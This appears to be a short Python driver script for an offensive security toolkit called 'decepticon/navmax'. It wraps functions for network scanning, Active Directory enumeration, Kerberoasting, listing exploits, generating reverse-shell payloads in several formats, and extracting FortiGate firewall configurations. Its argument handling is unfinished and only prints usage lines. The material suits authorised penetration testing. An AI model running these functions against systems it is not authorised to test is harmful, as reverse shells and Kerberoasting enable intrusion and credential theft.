import sys; sys.path.insert(0, 'packages/decepticon')
from importlib.machinery import SourceFileLoader
base = 'packages/decepticon/decepticon/navmax'

def scan(target):
    s = SourceFileLoader('s', f'{base}/scanner/engine.py').load_module()
    scanner = s.NetworkScanner()
    result = scanner.scan(target, s.ScanProfile.DEFAULT)
    print(result.summary())

def ad_enum(server, domain, user, password):
    ad = SourceFileLoader('ad', f'{base}/ad/engine.py').load_module()
    conn = ad.ADConnector(server, domain, user, password)
    if conn.connect():
        info = ad.ADEnumerator(conn).enumerate_all()
        print(info.summary())
        conn.close()
    else:
        print('Connection failed')

def kerberoast(domain, user, password, dc_ip):
    ad = SourceFileLoader('ad', f'{base}/ad/engine.py').load_module()
    tickets = ad.Kerberoaster(domain, user, password, dc_ip).roast()
    for t in tickets:
        print(f'{t.username}: {t.spn}')

def exploits():
    ex = SourceFileLoader('ex', f'{base}/exploit/engine.py').load_module()
    for name, info in ex.ExploitLoader.list_all().items():
        print(f'  {name}: {info.description}')

def payload(host, port=4444):
    ex = SourceFileLoader('ex', f'{base}/exploit/engine.py').load_module()
    for fmt in ['python', 'bash', 'powershell', 'nc']:
        p = ex.PayloadGenerator.reverse_shell(host, port, fmt)
        print(f'--- {fmt} ---\n{p.content}\n')

def firewall_check(host, api_key):
    import asyncio
    fw = SourceFileLoader('fw', f'{base}/firewall/engine.py').load_module()
    async def run():
        conn = fw.FortiGateConnector(host, api_key)
        config = await conn.extract_config()
        findings = fw.RuleAnalyzer().analyze(config)
        print(fw.RuleAnalyzer().summary(findings))
        for f in findings:
            print(f'  [{f.severity.value}] {f.description}')
        await conn.close()
    asyncio.run(run())

if __name__ == '__main__':
    import argparse
    p = argparse.ArgumentParser()
    sp = p.add_subparsers(dest='cmd')
    sp.add_parser('scan').add_argument('target')
    sp.add_parser('exploits')
    sp.add_parser('payload').add_argument('host')
    print('Usage: python run_scanner.py scan 127.0.0.1')
    print('       python run_scanner.py exploits')
